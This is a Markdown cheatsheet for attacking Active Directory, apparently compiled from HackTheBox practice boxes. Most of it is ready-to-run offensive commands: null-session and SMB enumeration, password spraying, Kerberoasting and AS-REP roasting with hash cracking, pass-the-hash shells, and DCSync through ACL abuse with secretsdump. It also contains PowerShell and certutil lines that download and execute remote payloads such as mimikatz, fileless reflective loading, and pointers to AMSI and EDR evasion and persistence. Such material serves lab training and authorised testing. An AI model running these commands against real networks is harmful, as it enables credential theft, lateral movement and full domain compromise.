# Active Directory Cheatsheet

## TTL at Ping command:
- At windows boxes TTL is usually 128
- At linux boxes TTL is ususally 64
- (maybe ^^)

## RPC Enumeration:
```bash
rpcclient -U "" -N "IP" 		(Null session)
```
### Once connected:
- enumdomusers
- enumdomgroups
- enumprinters
- querygroup "RID"
- querygroupmem "RID"
- queryuser "RID"
- getdompwinfo
- getdomuserpwinfo "RID"
- querydominfo
- querydispinfo
> Can also do password spraying through it

> We can change user's password using RPC if we have permissions
```
setuserinfo2
setuserinfo2 audit2020 23 password123!
```

## ldapdomaindump:
- Dumps domain info using LDAP
```bash
ldapdomaindump -u '"DOMAIN"\"USERNAME"' -p "PASSWORD" "IP ADDRESS" -o "OUTPUT DIRECTORY"
```

## DNS Issues:
- Zone Transfers
```bash
dig axfr @"IP ADDRESS" "DOMAIN NAME"
```
- Information Leaking
```
dig @"IP ADDRESS" "DOMAIN NAME"
dig ns @"IP ADDRESS" "DOMAIN NAME"
dig nx @"IP ADDRESS" "DOMAIN NAME"
dig any @"IP ADDRESS" "DOMAIN NAME"
dig all @"IP ADDRESS" "DOMAIN NAME"
```

## nslookup (Can give DNS records):
```bash
nslookup
> server "IP ADDRESS OF DNS SERVER"
> 127.0.0.1 (Reverse Lookup)
> "MACHINE IP ADDRESS" (Reverse Lookup of a Machine)
```

## DNSRECON:
- We can use `dnsrecon` to check for hostnames as well
```bash
dnsrecon -d "IP ADDRESS" -r "IP ADDRESS RANGE"
```

## IPC Share
- If we have IPC share with read only anonymus access we can dump information
```bash
lookupsid.py anonymous@"IP ADDRESS"
```
 
## SMB Enumeration:
- Look for anonymous login using `smbclient`
```bash
smbclient -L \\"IP ADDRESS"
```
- If we want to download everything using `smbclient`
```bash
smbclient //"IP ADDRESS"/"SHARE"
recurse ON
prompt OFF
mget *
```
- Look for access in shares using `smbmap`
```bash
smbmap -H "IP ADDRESS" -u null

smbmap -u "" -p "" -H "IP ADDRESS"

smbmap -u anonymous -H "IP ADDRESS"
```
- We can also list all files recursivly
```bash
smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS"
```
- If we want to download a file
```bash
smbmap -u "" -p "" -R "SHARE NAME" -H "IP ADDRESS" -A "FILE NAME" -q
```
- We can then locate it
- If found files through SMB or FTP download them and use `exiftool` to see if they leak a username

## Mount SMB Shares:
- We can mount SMB shares using
```bash
mount -t cifs //10.10.10.192/profiles$ /mnt
``` 

## smbpasswd:
- If we get a `NT_STATUS_PASSWORD_MUST_CHANGE` error we can change the pass using `smbpasswd`
```bash
smbpasswd -r "IP ADDRESS" -U "USERNAME"
```

## ldapsearch (to query ldap server for domain names and other information):
- -x = Anonymous bind
- -h = host
```bash
ldapsearch -h "IP" -x
ldapsearch -H ldap://10.129.134.37 -x
```
- -s = scope (which is usually set to base)
- namingcontext = finding  the domain name
```bash
ldapsearch -h "IP" -x -s base namingcontext
```
- -b = base
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")"
```
- This will give a lot of ldap information
- To search the output using ldapsearch we can use
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' # This will give out the users list on the ldap server
```
- To get usernames out of it we can do 
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' sAMAccountName
```
- To filter for usernames just use grep
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=User)' sAMAccountName | grep -i sAMAccountName | awk '{print $2}'
```
- To search for a string in the output like default passwords
```bash
ldapsearch -h 192.168.80.7 -x -b "DC=pwn,DC=local" | grep -i "default"
```
- If some creds are found they can be used to further enumerate LDAP
```bash
ldapsearch -h 10.10.10.192 -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
```

## Generating password list from a list of common passwords:
- Make a password list of all months, seasons, common words like password, secret (Forest.HTB for reference)
- Then use bash to add years to them
```bash
for i in $(cat passwords.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > t
mv t > passlist.txt
```
- Then use hashcat to generate pass list
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule
```
- Also adding a symbol to password
```bash
for i in $(cat passwords.txt); do echo $i; echo ${i}\!; done > t
mv t > passlist.txt
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule
```
- We can use another rule to embed cpaital letters in the passlist
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule
```
- But it may have duplicates so
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule | sort -u > p
```
- To just get the passwords which have length more than 7
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7' > p
mv p > passlist.txt
```

## Group Policy Decrypt (If we have SYSVOL):
- If we get access to SYSVOL share or we have any other way to retrieve Group Policies, we can extract the `Groups.xml` file containing username and cpassword
- With that we can use `gpp-decrypt` to decrypt the cpassword
```bash
gpp-decrypt "CPASSWORD"
```

## Crackmapexec:
- To check for password policy before doing a password spray to avoid account lockdown
```bash
crackmapexec smb "IP ADDRESS" --pass-pol -u '' -p ''
```
- We can also see it from `enum4linux` or `polenum`
- To do password spraying attack we can do 
```bash
crackmapexec smb "IP ADDRESS" -u "USER LIST" -p "PASS LIST"
```
- If we get a password we can then login to it
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -p "PASSWORD"
```
- If it says `pwned!` we can then use `psexec.py` to open up a shell
- If not we can see if we can list shares using it
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -p "PASSWORD" --shares
```
- We can use crackmapexec to also login using hashes
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -H "HASH"
```

## psexec.py:
- We can use `psexec.py` to login using the hashes
```bash
psexec.py -hashes "NT:LM" "USERNAME"@"IP ADDRESS"
psexec.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
```

## GetADUsers.py:
- If we have a username and password we can use `GetADUsers.py` to see users of AD
```bash
GetADUsers.py -all -dc-ip "IP ADDRESS" "DOMAIN"/"USERNAME"
```

## Kerbrute:
- We can check if the user exist on domain controller using
```bash
/opt/kerbrute/kerbrute userenum --dc 10.129.97.156 -d BLACKFIELD.local actual-users.txt
```

## Kerberoasting Cheatsheet:
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
- If we have a account username and password we can kerberoast using it
```bash
GetUserSPNs.py "DOMAIN"/"USERNAME":"PASSWORD" -request -outputfile hash
```
- We can then crack it using hashcat
```bash
hashcat -m 13100 -a 0 hash ~/Desktop/rockyou.txt --force
```
- If we get `CLOCK_SKET_TOO_GREAT` match the time with the DC time
```bash
# ON LINUX
date
# ON WINDOWS
date
# ON LINUX
date -s "TIME OF DC"
```

## AS-REP Roasting:
- This attack is used for users that do not need preauthentication in kerberos
```bash
GetNPUsers.py -dc-ip "IP ADDRESS" -request "'DOMAIN/'" -format hashcat
```
- Also can be done using a username list 
```bash
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip "IP ADDRESS" "DOMAIN"/${user} -format hashcat | grep -v Impacket; done
```
- We can then crack it using hashcat or john
```bash
hashcat -m 18200 hash.txt ~/Desktop/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
john --format=krb5asrep -w=~/Desktop/rockyou.txt hash.txt
```

## Evil-WinRM:
- If we have password and username for a user or service account, with winrm enabled, we can use this to login
```bash
evil-winrm -u "USERNAME" -p "PASSWORD" -i "IP ADDRESS"
```

## SeBackupPrivilege:
- Check Blackfield notes

## Things to check when we have password access in a domain:
- winrm
- smb
- ldap
- rpc
- lookupsid
- bloodhound
- kerberoast
- GetADUsers.py

## Privilege Escalation Methods:
- Winpeas.exe (To find)
- Unquoted Service Paths
- DCSync (Exchange Windows Permissions)(Check for `Outbound Control Rights` from `BloodHound`)
- WinLogon AutoCreds
```bash
reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" # ON WINDOWS
```

## File Transfer Methods:
- SMB Server
```bash
impacket-smbserver "SHARE NAME" $(pwd) -smb2support -user "USERNAME" -password "PASSWORD" # Starts the SMB Server

# ON WINDOWS
$pass = convertto-sevurestring "PASSWORD" -AsPlainText -Force # To convert it to useable password
$cred = New-Object System.Management.Automation.PSCredential("'USERNAME'", $pass) # Setting up cred object with username and password
New-PSDrive -Name "USERNAME" -PSProvider FileSystem -Credential $cred -Root \\"IP ADDRESS"\"SHARE NAME # Connecting the drive to windows
cd "USERNAME": # Get into the drive
```
- Cert Util
```bash
certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe
```
- Powershell
```bash
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.75/SharpHound.ps1')"

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"

powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")

Invoke-WebRequest "http://10.14.12.230/CLSID.ps1" -OutFile "CLSID.ps1"
```

## Bloodhound:
- Download a new copy of bloodhound because it gets updated frequently
- To get a new neo4j account we can delete the password file
```bash
locate neo4j | grep auth # Delete the auth file
bloodhound --no-sandbox # Start bloodhound with the password you set earlier

.\SharpHound.exe -c all --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice # On Windows
```
- If didnt work you can use `bloodhound-python` injestors instead
```bash
bloodhound-python -c all --domain htb.local -u svc-alfresco -p s3rvice -ns 10.129.149.232 -v
```
- You can change things in `SharpHound` to make more stealthy

## Rubeus:
-

## PowerSploit:
- Import `PowerView.ps1`
- To find users with DCSYnc perms
```bash
Get-ObjectACL "DC=pwn,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')}
```
- Check the identity of user
```bash
Get-ADUser -Identity S-1-5-21-899434533-4132491356-2237190077-1657 
```

## ShapView:
- C# implementation of `PowerView.ps1`
```
ShapView.exe Get-ObjectACL "DC=pwn,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')}
```

## PowerUp:
- Import `PowerUp.ps1` for checking privelege escalation paths
```
Import PowerUp.ps1
Invoke-AllChecks
```

## SharpUp:
- C# implementation of `PowerUp`
```
sharpup.exe audit
```

## Seatbelt:
- Post exploitaiton enumeration tool
```
Seatbelt.exe -group=all -full
```

## SharpSploit:
- Has a lot of tools we can use through DLL
- To import the DLL in a binary we can use the following methods
- Powershell Method using DLL on target:
```cs
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
```
- Powershell Method using remote DLL:
```cs
[System.Reflection.Assembly]::Load(new-object net.webclient).DownloadData("https://example.com/SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
```
- C# Method using remote DLL:
```cs
public class Program {
    public static void Main() {
        System.Reflection.Assembly.Load(new System.Net.WebClient().DownloadData("https://example.com/SharpSploit.dll")).GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""));
    }
}
```
- We can use this as reference code but we will need to have the `SharpSploit.dll` on the target as well, unless we use `ILMerge` or `Costura` to merge the binary and the DLL
```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpSploit;


namespace SharpSploitWhoAmI
{
    class Program
    {
        static void Main(string[] args)
        {
            SharpSploit.Credentials.Tokens tokens = new SharpSploit.Credentials.Tokens();
            string whoami = tokens.WhoAmI();
            Console.WriteLine(whoami);
            
        }
    }
}
```
- In `Costura` method, Write the code first then on the Reference section in Visual Studio add reference of the `SharpSploit.dll` and then compile
- We can also use `SharpGen` to generate a binary

## Reflection Method from URL:
- Can use this to load a payload from url using reflection method without touching disk
- Need to defeat AMSI before
```c
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[TotallyNotMal.Program]::Main()
```

## WinPEAS:
- Enumerate privelege escalation methods
- Can be obfuscated in `Visual Studio` using `dotfuscator`

## DACLs/ACLs:
`acl-pwn`
- Resource = https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
- We can abuse the DACLs/ACLs to pwn the Active Directory Network
- `WriteDACL`
- Can lead to DCSync Attack
- Import `PowerView.ps1`
- Use the commands mentioned in `Abuse Info` of `WriteDACL` in `BloodHound`
```powershell
$pass = convertto-securestring "PASSWORD OF USER THAT HAS WRITE DACL PERMS" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('"DOMAIN"\"PASSWORD OF USER THAT HAS WRITE DACL PERMS"', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DOMAIN BUT IN LDAP FORMAT (DC=htb, DC=local)" -PrincipalIdentity "USERNAME" -Rights DCSync
```
- Then we can use `secretsdump.py` to dump everything
```bash
secretsdump.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
```
- We can then use these hashes to see if we pwn any user using `crackmapexec`
- If pwned we can use them with `psexec.py` to get a shell
- We can also try to crack teh hases using `hashcat`
```bash
hashcat -m 1000 hashes ~/Desktop/rockyou.txt -r InsidePro-PasswordsPro.rule
```

## Fingerprinting Antivirus:
```bash
wmic.exe /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get *
```

## Persistence Mechanisms:
- C2
- COM Persistence
- DLL Hijacked Persistence
- DLL Side Loading
- Task Scheduler
- Registry Keys
- Startup Folder
- `SharpPersist`
- `Fake-AMSI-Provider`

## Initial Access:
- VBA Stomping/Purging

## AMSI Bypass
- `amsi.fail`
- `https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell`
- `https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/`
- `https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/`
- AMS-BP
- `SharpUnhooker`
- `SysCallAMSIScanBufferBypass`
- AMSI Trigger
- PS-AMSI
- ThreatCheck
- DefenderCheck

## Some AD Attacks:
- kerbrelayup
- zerologon
- printnightmare

## Automation
- `WinPWN`
- `autoenum`
- `threader3000`